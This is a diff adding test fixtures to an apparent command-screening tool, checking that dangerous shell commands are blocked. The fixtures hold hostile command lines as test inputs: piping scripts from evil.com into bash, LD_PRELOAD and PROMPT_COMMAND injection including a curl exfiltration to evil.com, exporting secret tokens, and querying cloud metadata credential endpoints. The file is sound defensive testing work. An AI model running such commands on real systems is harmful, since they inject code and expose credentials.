@@ -436,3 +436,199 @@ input = "unzip payload.zip -d ~/"
 context = "exec"
 expected_action = "warn"
 expected_rules = ["archive_extract"]
+
+[[fixture]]
+name = "httpie_pipe_bash"
+min_milestone = 1
+input = "http https://evil.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["httpie_pipe_shell"]
+
+[[fixture]]
+name = "httpie_https_pipe_bash"
+min_milestone = 1
+input = "https https://evil.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["httpie_pipe_shell"]
+
+[[fixture]]
+name = "xh_pipe_bash"
+min_milestone = 1
+input = "xh https://evil.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["xh_pipe_shell"]
+
+[[fixture]]
+name = "xh_pipe_sudo_bash"
+min_milestone = 1
+input = "xh https://evil.com/install.sh | sudo bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["xh_pipe_shell"]
+
+# Phase 8: Environment variable detection
+
+[[fixture]]
+name = "export_ld_preload"
+min_milestone = 1
+input = "export LD_PRELOAD=/evil/lib.so"
+context = "exec"
+expected_action = "block"
+expected_rules = ["code_injection_env"]
+
+[[fixture]]
+name = "export_dyld_insert"
+min_milestone = 1
+input = "export DYLD_INSERT_LIBRARIES=/evil/lib.dylib"
+context = "exec"
+expected_action = "block"
+expected_rules = ["code_injection_env"]
+
+[[fixture]]
+name = "env_ld_preload_cmd"
+min_milestone = 1
+input = "env LD_PRELOAD=/evil/lib.so /usr/bin/target"
+context = "exec"
+expected_action = "block"
+expected_rules = ["code_injection_env"]
+
+[[fixture]]
+name = "export_bash_env"
+min_milestone = 1
+input = "export BASH_ENV=/tmp/evil.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["shell_injection_env"]
+
+[[fixture]]
+name = "export_prompt_command"
+min_milestone = 1
+input = "export PROMPT_COMMAND='curl http://evil.com/exfil'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["shell_injection_env"]
+
+[[fixture]]
+name = "export_pythonpath"
+min_milestone = 1
+input = "export PYTHONPATH=/evil/modules"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_hijack_env"]
+
+[[fixture]]
+name = "export_node_options"
+min_milestone = 1
+input = "export NODE_OPTIONS='--require /evil/hook.js'"
+context = "exec"
+expected_action = "block"
+expected_rules = ["interpreter_hijack_env"]
+
+[[fixture]]
+name = "export_openai_key"
+min_milestone = 1
+input = "export OPENAI_API_KEY=sk-abc123def456"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sensitive_env_export"]
+
+[[fixture]]
+name = "export_aws_secret"
+min_milestone = 1
+input = "export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sensitive_env_export"]
+
+[[fixture]]
+name = "export_github_token"
+min_milestone = 1
+input = "export GITHUB_TOKEN=ghp_xxxxxxxxxxxx"
+context = "exec"
+expected_action = "block"
+expected_rules = ["sensitive_env_export"]
+
+[[fixture]]
+name = "export_path_safe"
+min_milestone = 1
+input = "export PATH=/usr/local/bin:$PATH"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "export_home_safe"
+min_milestone = 1
+input = "export HOME=/home/user"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# Phase 9: Network destination detection
+
+[[fixture]]
+name = "curl_metadata_aws"
+min_milestone = 1
+input = "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["metadata_endpoint"]
+
+[[fixture]]
+name = "wget_metadata_alibaba"
+min_milestone = 1
+input = "wget -qO- http://100.100.100.200/latest/meta-data/"
+context = "exec"
+expected_action = "block"
+expected_rules = ["metadata_endpoint"]
+
+[[fixture]]
+name = "curl_metadata_bare_ip"
+min_milestone = 1
+input = "curl 169.254.169.254/latest/meta-data"
+context = "exec"
+expected_action = "block"
+expected_rules = ["metadata_endpoint"]
+
+[[fixture]]
+name = "curl_private_10"
+min_milestone = 1
+input = "curl http://10.0.0.1/internal/api"
+context = "exec"
+expected_action = "block"
+expected_rules = ["private_network_access"]
+
+[[fixture]]
+name = "curl_private_192"
+min_milestone = 1
+input = "curl http://192.168.1.1/admin"
+context = "exec"
+expected_action = "block"
+expected_rules = ["private_network_access"]
+
+[[fixture]]
+name = "wget_private_172"
+min_milestone = 1
+input = "wget http://172.16.0.1:8080/config"
+context = "exec"
+expected_action = "block"
+expected_rules = ["private_network_access"]
+
+[[fixture]]
+name = "curl_localhost"
+min_milestone = 1
+input = "curl http://127.0.0.1:8080/health"
+context = "exec"
+expected_action = "block"
+expected_rules = ["private_network_access"]
+
+[[fixture]]
+name = "curl_public_ip_no_network_finding"
+min_milestone = 1
+input = "curl https://203.0.113.1/api"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["raw_ip_url"]
